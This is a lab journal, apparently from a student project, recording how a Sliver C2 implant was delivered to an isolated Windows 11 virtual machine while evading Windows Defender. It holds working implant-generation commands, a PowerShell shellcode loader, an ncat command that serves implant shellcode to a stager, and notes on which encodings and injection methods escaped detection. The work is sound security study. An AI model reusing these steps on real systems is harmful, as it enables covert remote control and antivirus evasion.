
### Feb 14
I decided to use Windows 11 image for victim machine due to its wide usage in the world. Virtual machine so that it is in a controlled environment. I also changed the victim machine (w11vi) network settings to "Host-Only" by changing the Adapter to Host-Only Adapter. This is to keep the VM offline but open to C2 communication. I wanted to keep the VM offline because Caeland brought to my awareness that connecting the victim device to the internet opens it up to attacks from actual attackers and that may affect my host machine, which I didn't want. So by setting my victim's machine IP to 192.168.56.100 (192.168.56.x range since subnet mask is (255.255.255.0 (/24)) ) and its default gateway to 192.168.56.1 (my host IP), so that the host (C2 server) and victim can communicate.

---

### Setting up Sliver
1. Clone this repo: `git clone --recursive https://github.com/ChamberZ1/Sliver.git`
2. Build Sliver: `cd sliver && make`
   
---

### Feb 17
Testing out Sliver, I first ran the server: `sudo ./sliver-server`. I created an implant using `generate --mtls 192.168.56.1`, where:
- `--mtls` specifies to use Mutual TLS encryption for communication. From the Sliver documentation: "you must specify at least one C2 endpoint using `--mtls`, `--wg`, `--http`, or `--dns`." It is recommended to use `--mtls` or `--wg` where possible 
- Note: `192.168.56.1` is not my internet IP, but the IP of the VirtualBox Host-Only Adapter which acts as a gateway for the Linux (Host) machine and Windows (Victim) virtual machine to communicate.

The implant was saved to `/home/charlitos/sliver/`. I created an HTTP server using `python3 -m http.server 8080` to send the file to the Windows machine. I used `Invoke-WebRequest -Uri http://192.168.56.1:8080/implant_name.exe C:\Users\Public\any_name.exe` to receive the file on the Windows machine. However, Windows Defender was blocking it and so I temporarily disabled Windows Defender. Then, I ran the implant `any_name.exe` and went back to Sliver on the host device.

I set up a listener on Sliver using `mtls --lhost 192.168.56.1 --lport 443`. I used port 443 to try and blend in with normal internet traffic. 

I had to change some firewall permissions on my Linux device (specifically port 443 and 8080 from 192.168.56.100) to allow communication and file transfer between host and victim machine.

So it worked, I was able to execute commands on the victim machine, and open the shell to do more. I did receive a warning regarding "bad OPSEC" when I opened a shell. This basically means that what I did was easily detectable, so that's something I could look into.

Also, the implant works only as long as it is a running process. 

---

### Feb 28
My Objective now is to modify the implant in some way to get it onto the Windows machine without Defender noticing. If we can do that, we will then see if we can hit Defender with something to get it to let default implants to slip by.

So far, we are able to transfer the file onto Windows without Defender flagging it as long as it is zipped or using upx.

Modifying the implant: 
- I attempted to `echo "rndmdata123" >> implant.exe`, to mess with the signature and see if it would evade detection, but it did not work.

### March 4
Updates:
I'm going through a bunch of websites and blogs to see how others are doing this. Plan is to use stagers
Installed Metasploit to get SSL cert and key to encrypt the communication between the stager and listener when it is retrieving the implant, so that AV doesn't detect it. 
I generate a certificate in PEM format using a module by Chris John Riley called impersonate_ssl that will generate one based on the information it gathers from the certificate of a website specified in the RHOST parameter of the module. This makes the cert look legitimate. In the example I follow, they use Google's SSL cert as the base for the fake cert. 
https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8
https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation
 
Notes:

$ generate beacon --mtls -e
Generate beacon implant, using --mtls, -e for including evasion techniques
GOT FLAGGED

Base64 Encoding:
$ base64 implant. exe > implant.b64
> certutil -decode implant.b64 implant.exe
GOT FLAGGED

Zip Files:
GOT FLAGGED

Encrypted Zip File:
DID NOT GET FLAGGED UPON EXTRACTION

---

Stagers and Process injection:
A stager is a small initial payload that retrieves a larger payload (a Sliver implant) from a remote C2 server. It acts as a first-stage loader that downloads and executes the actual malware. 

Process injection is a technique where malicious code is injected into a legitimate process (like explorer.exe or notepad.exe) so that the implant runs inside the trusted process instead of creating its own malicious-looking process.

Process injection itself won't bypass Windows Defender, but it makes detection harder. Whether Windows Defender catches the Sliver implant depends on how the stager and beacon are delivered and executed.

"Sliver implants provide some basic obfuscation but they are not designed for AV or EDR evasion." https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/

---

Executing in Memory:
This means running code without writing it to disk. Instead of saving a file like .exe to the system and then running (Disk-based execution), the code is loaded directly into memory (RAM) and executed from there. This is a common evasion technique.

Can be detected by Memory-based monitoring.

Often used with processing injection to evade detection.

### March 6
Continuing off from March 4 work:
Followed the darkoperator article for the most part. Hit some roadblocks due to different metasploit versions operating differently. For example, the example used `use exploit/multi/handler` and `set HANDLERSSLCERT <path to PEM file>`. However, my version did not have `HANDLERSSLCERT`. 

Reverse shells using HTTP or HTTPS can be detected easily when security tools inspect traffic. SSL is used to encrypt traffic between target machine and the attacker listener, making it harder for defense systems to inspect payloads. An SSL certificate ensures that only the intended endpoints have access to the traffic (attacker and victim). Impersonated certificates help cloak the traffic as legitimate traffic. However, security tools have improved over the years and this method is not as effective as it once was. 

Using mTLS authenticates both sides for better security. It sort of acts as an assurance for the attacker that it is communicating with the target and not some defense system. 

This ended up not even mattering because I don't think Defender Antivirus monitors network traffic, at least not deep enough for this to matter. We ended up just using --mtls.

---

### March 16
Creating a custom c2profile: `sliver > c2profiles generate -f /home/charlitos/sliver/uris.txt -n custom-c2profile -i`. This defines transport behavior and how the implant communicates. This is different from `profiles new ...`,  which creates a profile that is used when generating an implant, which dictates how the implant itself should behave.

Creating a custom (beacon) implant profile: `profiles new beacon stealthy-beacon --http https://192.168.50.1:443 --c2profile custom-c2profile --format shellcode --arch amd64 --evasion --seconds 60 --jitter 3`.

^^^ scratch all this. I had issues trying to make a custom c2profile and then creating an implant profile using the custom c2profile. It didn't work out.

Generates beacon implant (previously I had thought this generates a stager, it DOESNT) `generate beacon --name stealth-stager --format shellcode --arch amd64 --http https://192.168.50.1:443 --c2profile default --evasion --skip-symbols --poll-timeout 60 --reconnect 60` 

Key aspects of the generated beacon based on the command:

    It uses HTTP(S) for communication with the C2 server at 192.168.50.1:443

    It applies the "default" C2 profile for traffic shaping

    Evasion techniques are enabled

    Symbol obfuscation is skipped for faster compilation

    The poll timeout is set to 60 seconds

    It will attempt to reconnect every 60 seconds if the connection is lost


We use a loader as it is a way to execute the stager more stealthily. Supposedly once we get the stager shellcode onto the system and running, the stager will communicate with the c2 server and have it auto build and send the full implant over.

---

### March 23
Using above stealth-stager, Base64-encode the stager: `base64 stealth-stager.bin > shellcode.txt`. Use DropBox to transfer onto Windows Machine. Tried using .7z to encrypt the file for better stealth when getting it onto the Windows System (try to avoid scanning), but Windows by default does not come with any tools that can extract .7z files. So I tried transferring the base64-encoded stager `shellcode.txt` to the Windows machine using DropBox and Defender didn't flag it (this is because base64 encode makes it appear as a regular txt file).

So... this was just a beacon implant all along, not a stager or loader by any means. We're going to see if we can get it to run without Defender detecting. 

Powershell command to run the beacon implant .bin.
```
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Exec {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("msvcrt")]
    public static extern IntPtr memcpy(IntPtr dest, byte[] src, int count);
}
"@

$shellcode = [System.IO.File]::ReadAllBytes("C:\Users\w11vi\Downloads\bacon.bin")
$size = $shellcode.Length
$mem = [Exec]::VirtualAlloc(0, $size, 0x3000, 0x40)
[Exec]::memcpy($mem, $shellcode, $size)
[Exec]::CreateThread(0, 0, $mem, 0, 0, 0)
```
Generating a default executable beacon implant to see if Windows Defender will pick it up: ` generate beacon --name exe-beacon --format exe --arch amd64 --http https://192.168.56.1:8443 --c2profile default --evasion` (Tried transferring onto Windows raw .exe file AND base64 encoded - GOT FLAGGED - executables are easily flagged)


---

### April 1
`profiles new beacon --mtls 192.168.56.1 --format shellcode --arch amd64 --evasion default_beacon_profile`

`stage-listener --url tcp://192.168.56.1:8443 --profile default_beacon_profile`

---

### April 4
creating a custom stager to get the implant on the Windows machine. I'm developing the stager on the vm because I've read that it is better to develop code meant for Windows on Windows (Breuker).

---

### April 7

apparently stage-listener expects the receiver to speak sliver's protocol(whatever that means). New approach is to generate manually a beacon implant shellcode and then host it on a TCP listneer.

### April 8

Generating session implant shellcode. This is the one I retrieve using my stager and inject into a process on Windows. `generate --mtls 192.168.56.1:443 --format shellcode --name FLYING_PENCIL --save session_implant.bin`. So the implant name is FLYING_PENCIL. The .bin is session_implant.bin.

### April 10

I GOT THROUGH! I build the stager code into an executable, and double click it, run `sudo ncat -lvnp 8000 --send-only --exec "/bin/cat session_implant.bin"` on my linux machine to transfer the implant shellcode, and the stager will fetch the implant and execute it into a process (i used notepad).

This didn't end up working. It worked with Defender off, but once Defender was active, it was flagged and the process was killed. I am trying self-injection next, injecting the implant into the process our stager code is running in.

---

### April 18

Using self-injection worked!

Wrapping up. On Windows VM, I make sure that I have two active network adapters on the virtualbox, one for the internet, the other for connectivity between the VM and my linux machine (host-only, vboxnet0).

On Linux, set firewall permissions to allow windows machine to communicate with it on a certain port. `sudo ufw allow from 192.168.56.102 to any port 8000 proto tcp`.

On Windows, verify connection is able to go through. On powershell: `Test-NetConnection 192.168.56.1 -Port 8000`.

Use `sudo ncat -lvnp 8000 --send-only --exec "/bin/cat session_implant.bin"` to prep the implant shellcode for transfer when the stager reaches out to the c2 server to fetch.

